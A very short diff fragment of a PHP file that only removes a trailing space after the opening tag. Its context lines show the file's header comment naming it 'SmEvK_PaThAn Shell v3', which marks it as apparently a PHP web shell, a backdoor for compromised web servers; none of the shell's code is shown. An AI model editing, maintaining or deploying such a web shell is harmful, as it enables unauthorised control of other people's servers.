@@ -1,4 +1,4 @@
-<?php 
+<?php
 /*
 
 SmEvK_PaThAn Shell v3 Coded by Kashif Khan .
